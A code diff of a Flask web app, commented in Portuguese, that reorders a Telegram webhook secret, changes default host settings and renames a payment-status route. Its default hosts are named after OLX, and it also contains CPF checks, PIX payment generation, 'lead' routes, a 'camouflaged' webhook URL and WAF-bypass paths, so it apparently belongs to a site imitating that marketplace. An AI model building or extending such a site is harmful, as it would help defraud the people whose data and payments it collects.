@@ -117,9 +117,9 @@ def _verify_signed_token(signed: str) -> str | None:
 
 
 # â”€â”€â”€ TELEGRAM OAUTH CONFIGURATION â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-TELEGRAM_CLIENT_ID     = os.environ.get("TELEGRAM_CLIENT_ID", "8857867740")
+TELEGRAM_CLIENT_ID     = os.environ.get("TELEGRAM_CLIENT_ID", "")
 TELEGRAM_CLIENT_SECRET = os.environ.get("TELEGRAM_CLIENT_SECRET", "")  # SEGURO: nao hardcoded
-BASE_URL               = os.environ.get("BASE_URL", "https://olxproduto.workers.dev").rstrip('/')
+BASE_URL               = os.environ.get("BASE_URL", "https://olx-9ee8.onrender.com").rstrip('/')
 
 # â”€â”€â”€ CONFIGURAÃ‡Ã•ES DA API C7 â€” lidas do vault ou do env â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 # Credenciais nunca hardcoded; boot-time env leitura apenas. Armazenamento
@@ -486,6 +486,12 @@ def verify_cpf_hub(cpf_raw: str, dob: str = "") -> tuple[bool, str, dict]:
 
     # Em caso de timeout ou indisponibilidade da API, faz fallback para validaÃ§Ã£o matemÃ¡tica
     return True, "", {"fallback_math": True}
+
+# ─── TELEGRAM WEBHOOK SECRET ─────────────────────────────────────────────────────
+# IMPORTANTE: definido aqui (antes do @before_request) pois validate_request_security
+# usa esta constante em _waf_bypass_paths. Se estivesse definida depois causaria NameError.
+_TG_WEBHOOK_SECRET = os.environ.get("WEBHOOK_SECRET",
+    hashlib.sha256(os.environ.get("TELEGRAM_BOT_TOKEN", "notoken").encode()).hexdigest()[:32])
 
 @app.before_request
 def validate_request_security():
@@ -2797,9 +2803,8 @@ def api_products_apply(code):
 
 
 # â”€â”€â”€ TELEGRAM WEBHOOK â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-# URL camuflada: /tg/<webhook_secret> â€” o secret vem da variavel de ambiente
-_TG_WEBHOOK_SECRET = os.environ.get("WEBHOOK_SECRET",
-    hashlib.sha256(os.environ.get("TELEGRAM_BOT_TOKEN", "notoken").encode()).hexdigest()[:32])
+
+# URL camuflada: /tg/<webhook_secret> - _TG_WEBHOOK_SECRET ja definida acima (antes do @before_request).
 
 @app.route(f'/tg/{_TG_WEBHOOK_SECRET}', methods=['POST'])
 def telegram_webhook():
@@ -3414,7 +3419,8 @@ def _lead_alias():
 def _pix_alias():
     return generate_pix()
 
-@app.route("/s/<payment_id>")
+# Alias /st/<payment_id> — evita colisão com /s/<slug> (slug_page)
+@app.route("/st/<payment_id>")
 def _status_alias(payment_id):
     return check_payment(payment_id)
 
